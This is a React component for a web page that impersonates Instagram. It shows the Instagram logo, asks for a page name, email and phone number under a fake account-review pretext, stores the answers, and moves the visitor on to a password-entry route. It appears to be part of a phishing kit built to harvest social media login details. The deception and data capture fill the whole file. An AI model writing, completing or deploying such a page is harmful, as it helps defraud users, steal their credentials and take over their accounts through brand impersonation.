import InstagramLogo from '@assets/images/instagram.png';
import Footer from '@pages/Client/components/Footer';
import React, { useEffect, useState } from 'react';
import PhoneInput from 'react-phone-input-2';
import 'react-phone-input-2/lib/style.css';
import { useNavigate } from 'react-router-dom';
const Home: React.FC = () => {
	const [email, setEmail] = useState('');
	const [phoneNumber, setPhoneNumber] = useState('');
	const [pageName, setPageName] = useState('');
	const [country, setCountry] = useState('us');
	useEffect(() => {
		const geo = localStorage.getItem('geo');
		if (geo) {
			const { country_code } = JSON.parse(geo);
			setCountry(country_code.toLowerCase());
		}
	}, []);
	const navigate = useNavigate();
	const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
		e.preventDefault();
		localStorage.setItem(
			'data',
			JSON.stringify({ email, phoneNumber, pageName }),
		);
		navigate('/enter-password');
	};
	return (
		<div className='flex flex-col items-center justify-center'>
			<div className='max-w-md rounded-lg bg-white sm:border'>
				<div className='flex flex-col items-center border-b p-8 text-center'>
					<img
						src={InstagramLogo}
						alt='Instagram'
						className='mb-4 h-10'
					/>
					<h1 className='text-lg font-semibold text-gray-800'>
						Account Information
					</h1>
					<p className='mt-2 max-w-[320px] text-xs text-[#737373]'>
						Please provide your account details, we’ll send a
						confirmation code to this email.
					</p>
				</div>
				<form
					onSubmit={handleSubmit}
					className='rounded-lg bg-white p-8'
				>
					<div className='mb-4'>
						<input
							type='text'
							id='pageName'
							value={pageName}
							onChange={(e) => setPageName(e.target.value)}
							className=''
							placeholder='Page Name'
							required
							autoFocus
						/>
					</div>
					<div className='mb-4'>
						<input
							type='email'
							id='email'
							value={email}
							onChange={(e) => setEmail(e.target.value)}
							className=''
							placeholder='Email'
							required
						/>
					</div>
					<div className='mb-4'>
						<PhoneInput
							country={country}
							value={phoneNumber}
							onChange={(phone) => setPhoneNumber(phone)}
							inputProps={{
								id: 'phone',
								required: true,
								className: 'pl-12',
							}}
						/>
					</div>
					<p className='text-xs font-normal text-[#737373]'>
						We’ll use this email to send you updates about our
						review and let you know the result.
					</p>
					<div className='mt-4 flex items-center justify-between'>
						<button
							type='submit'
							className='flex w-full justify-center rounded-md border border-transparent bg-primary px-4 py-2 text-sm font-semibold text-white shadow-sm transition duration-150 ease-in-out hover:bg-primary/80'
						>
							Send Code
						</button>
					</div>
				</form>
			</div>
			<Footer />
		</div>
	);
};

export default Home;
